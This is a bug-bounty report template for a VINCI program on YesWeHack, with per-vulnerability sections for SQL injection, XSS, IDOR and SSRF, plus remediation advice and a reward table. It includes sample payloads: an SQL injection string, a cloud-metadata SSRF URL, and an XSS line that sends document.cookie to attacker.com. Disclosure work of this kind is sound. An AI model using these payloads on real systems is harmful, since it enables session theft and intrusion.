# VINCI Bug Bounty - Vulnerability Report Template

## How to Use This Template
1. Copy the relevant section below based on your vulnerability type
2. Fill in all fields with specifics from your finding
3. Include screenshots at every step
4. Ensure reproducibility — another person should be able to follow your steps
5. Submit on YesWeHack platform

---

## Universal Report Structure

```
## Title
[VulnType] - [Brief Description] on [Target]

Example: "Stored XSS via profile bio field on boost.vinci.com"
Example: "IDOR allows reading other users' documents on vinci-groupe.profils.org"
```

---

## SECTION 1: Summary

```markdown
## Summary

**Vulnerability Type**: [SQLi / XSS / RCE / IDOR / Auth Bypass / SSRF / etc.]
**Target**: [Full URL of affected endpoint]
**Severity**: [Critical / High / Medium / Low]
**CVSS Score**: [Calculate at https://www.first.org/cvss/calculator/3.1]

### Brief Description
[2-3 sentences explaining what the vulnerability is, where it exists, 
and what an attacker could achieve by exploiting it.]
```

---

## SECTION 2: Steps to Reproduce

```markdown
## Steps to Reproduce

### Prerequisites
- Account required: [Yes/No - if yes, describe registration steps]
- Authentication state: [Logged in / Logged out / Specific role]
- Browser: [Any / Specific browser required]
- Tools needed: [Burp Suite / curl / browser only]

### Step-by-Step

**Step 1**: [First action]
- URL: `https://target.vinci.com/path`
- Method: `GET/POST`
- Screenshot: [attach]

**Step 2**: [Second action]
- Modify parameter `X` to value `Y`
- Request:
```
POST /api/endpoint HTTP/1.1
Host: target.vinci.com
User-Agent: ... -BugBounty-vinci-31337 
Cookie: session=abc123
Content-Type: application/json

{"param": "payload_here"}
```
- Screenshot: [attach]

**Step 3**: [Observe the result]
- Response shows: [what you observe]
- Screenshot: [attach]

### Proof of Exploitation
[Final screenshot/evidence showing the vulnerability was successfully exploited]
```

---

## SECTION 3: Impact Assessment

```markdown
## Impact

### Security Impact
[Describe what an attacker can achieve:]
- Can read other users' personal data (names, emails, addresses)
- Can modify other users' account settings
- Can execute arbitrary code on the server
- Can steal session tokens of other users

### Business Impact
[Describe business consequences:]
- User trust / reputation damage
- Data breach notification obligations (GDPR)
- Financial loss potential
- Service availability impact

### Affected Users/Data
- Number of potentially affected users: [estimate]
- Type of data at risk: [PII / credentials / financial / internal]
- Attack complexity: [Low - anyone can do it / High - requires specific conditions]
```

---

## SECTION 4: Remediation

```markdown
## Remediation Advice

### Recommended Fix
[Specific technical advice on how to fix this vulnerability]

### Example Fix (if applicable)
```code
// Before (vulnerable)
query = "SELECT * FROM users WHERE id = " + user_input

// After (fixed)
query = "SELECT * FROM users WHERE id = ?"
cursor.execute(query, (user_input,))
```

### References
- [OWASP: Vulnerability Name](https://owasp.org/relevant-page)
- [CWE-XXX: Weakness Name](https://cwe.mitre.org/data/definitions/XXX.html)
```

---

## Vulnerability-Specific Templates

### Template A: SQL Injection Report

```markdown
## Title
SQL Injection in [parameter] on [target]

## Summary
**Type**: SQL Injection (Error-based / Blind / Union-based)
**Target**: https://[target]/[endpoint]
**Parameter**: [parameter name]
**Method**: [GET/POST]
**Severity**: High/Critical
**CVSS**: [score]
**CWE**: CWE-89

## Description
The [parameter] parameter on [endpoint] is vulnerable to SQL injection.
User-supplied input is directly incorporated into SQL queries without 
proper sanitization or parameterized queries.

## Steps to Reproduce
1. Navigate to: `https://[target]/[endpoint]`
2. Inject the following payload in the [parameter] field:
   ```
   ' OR 1=1--
   ```
3. Observe: [error message / behavior change / data returned]

### Request
```
GET /endpoint?param=' OR 1=1-- HTTP/1.1
Host: target.vinci.com
User-Agent: ... -BugBounty-vinci-31337
```

### Response (showing SQL error / data)
```
[paste relevant response portion]
```

## Proof of Concept
- Extracted database version: [version string]
- Screenshot: [attach]

## Impact
- An attacker can extract all data from the database
- Potential for authentication bypass
- In severe cases, OS command execution via SQL

## Remediation
- Use parameterized queries / prepared statements
- Implement input validation (whitelist acceptable characters)
- Apply principle of least privilege to database accounts
- Deploy WAF rules as defense-in-depth

## References
- https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
```

---

### Template B: Cross-Site Scripting (XSS) Report

```markdown
## Title
[Stored/Reflected] XSS via [input field] on [target]

## Summary
**Type**: Cross-Site Scripting ([Stored/Reflected])
**Target**: https://[target]/[endpoint]
**Input Vector**: [field/parameter name]
**Severity**: Medium/High
**CVSS**: [score]
**CWE**: CWE-79

## Description
The [field/parameter] on [endpoint] does not properly sanitize user input
before rendering it in the HTML response. An attacker can inject 
JavaScript that executes in the context of other users' browsers.

## Steps to Reproduce
1. [If stored: Create account / Navigate to profile/form]
2. In the [field] input, enter:
   ```
   <img src=x onerror=alert(document.domain)>
   ```
3. [If stored: Save/submit the form]
4. [If reflected: Visit the crafted URL]
5. Observe: JavaScript alert showing the domain

### Payload Used
```
<img src=x onerror=alert(document.domain)>
```

### Injection Point (in HTML source)
```html
<div class="user-content">
  <img src=x onerror=alert(document.domain)>  ← injected here
</div>
```

## Proof of Concept
- Screenshot showing alert(document.domain) firing: [attach]
- For stored XSS: screenshot showing it fires for another user/session
- Cookie theft PoC (demonstrating real impact):
  ```
  <img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
  ```

## Impact
- Attacker can steal session cookies of other users
- Attacker can perform actions on behalf of victims
- Potential for account takeover via session hijacking
- Can be used for phishing within trusted domain

## Remediation
- Implement output encoding (HTML entity encoding)
- Use Content-Security-Policy header
- Apply context-aware encoding (HTML/JS/URL/CSS contexts)
- Use DOMPurify or similar library for rich text

## References
- https://owasp.org/www-community/attacks/xss/
- CWE-79: Improper Neutralization of Input During Web Page Generation
```

---

### Template C: IDOR Report

```markdown
## Title
IDOR allows [action] on other users' [resource] on [target]

## Summary
**Type**: Insecure Direct Object Reference (IDOR)
**Target**: https://[target]/[endpoint]
**Parameter**: [id/resource parameter]
**Severity**: Medium/High/Critical
**CVSS**: [score]
**CWE**: CWE-639

## Description
The [endpoint] does not verify that the authenticated user owns the 
requested [resource]. By changing the [parameter] value, an attacker 
can [read/modify/delete] other users' [resource type].

## Steps to Reproduce

### Setup
1. Register Account A (victim): [email_a@yeswehack.ninja]
2. Register Account B (attacker): [email_b@yeswehack.ninja]
3. As Account A, create [resource] — note the ID: [ID_A]
4. As Account B, note own ID: [ID_B]

### Exploitation
5. Log in as Account B
6. Send the following request (changing ID to Account A's):
```
GET /api/users/[ID_A]/[resource] HTTP/1.1
Host: target.vinci.com
User-Agent: ... -BugBounty-vinci-31337
Cookie: session=[ACCOUNT_B_SESSION]
```

7. Response returns Account A's data:
```json
{
  "user_id": "[ID_A]",
  "name": "Account A Name",
  "email": "email_a@yeswehack.ninja",
  "sensitive_field": "value"
}
```

## Proof of Concept
- Screenshot: Account B accessing Account A's data [attach]
- Comparison: Same data visible to Account A legitimately [attach]

## Impact
- Any authenticated user can access all other users' [resource]
- Exposed data includes: [list PII/sensitive fields]
- [If write IDOR]: Attacker can modify other users' data
- Estimated affected users: [all registered users]

## Remediation
- Implement server-side authorization checks
- Verify requesting user owns/has permission to access the resource
- Use indirect references (map user's resources to their session)
- Log and alert on access pattern anomalies

## References
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
- CWE-639: Authorization Bypass Through User-Controlled Key
```

---

### Template D: SSRF Report

```markdown
## Title
SSRF via [feature] on [target] allows [internal access/cloud metadata]

## Summary
**Type**: Server-Side Request Forgery (SSRF)
**Target**: https://[target]/[endpoint]
**Input Vector**: [URL parameter/field]
**Severity**: Medium/High/Critical
**CVSS**: [score]
**CWE**: CWE-918

## Steps to Reproduce
1. Navigate to [feature] on [target]
2. In the [URL/field] input, enter:
   ```
   http://169.254.169.254/latest/meta-data/
   ```
3. The server fetches the internal URL and returns:
   ```
   [cloud metadata response]
   ```

## Impact
- Can access internal services not exposed to internet
- [If cloud metadata]: Can retrieve IAM credentials
- Can perform port scanning of internal network
- Potential for full server compromise via credential theft

## Remediation
- Whitelist allowed URL schemes and domains
- Block requests to internal/private IP ranges
- Use a dedicated proxy for outbound requests
- Implement SSRF-aware URL validation

## References
- https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- CWE-918: Server-Side Request Forgery
```

---

## CVSS Quick Reference

Use: https://www.first.org/cvss/calculator/3.1

### Common Scores for VINCI Program:
| Vulnerability | Typical CVSS | Typical Reward |
|--------------|-------------|----------------|
| RCE | 9.0-10.0 (Critical) | €1,500-€3,000 |
| SQLi (data extraction) | 7.5-9.8 (High-Critical) | €1,000-€3,000 |
| Auth Bypass (full) | 8.0-9.8 (High-Critical) | €1,000-€3,000 |
| Stored XSS (affects others) | 6.1-8.0 (Medium-High) | €400-€1,000 |
| IDOR (read PII) | 6.5-7.5 (Medium-High) | €400-€1,000 |
| IDOR (write/delete) | 7.5-8.5 (High) | €800-€1,000 |
| SSRF (internal access) | 6.0-9.0 (Medium-Critical) | €400-€3,000 |
| CORS (data theft) | 5.0-7.5 (Medium-High) | €300-€800 |
| Reflected XSS | 4.0-6.0 (Medium) | €300-€500 |
| Open Redirect (chained) | 4.0-6.0 (Medium) | €100-€400 |

---

## Report Writing Tips

1. **Be concise but complete** — Triagers read many reports daily
2. **One vulnerability per report** — Don't bundle unrelated issues
3. **Screenshots at every step** — Visual proof is critical
4. **Include raw requests** — Copy from Burp Suite
5. **Show real impact** — Don't just show alert(1), show cookie theft
6. **Provide fix advice** — Makes your report more valuable
7. **Use proper severity** — Overrating = report sent back, underrating = less reward
8. **Check for duplicates** — Is this a known issue or shared codebase fix?
9. **Be professional** — Clear language, structured format
10. **Respond quickly** — If triagers ask questions, reply fast
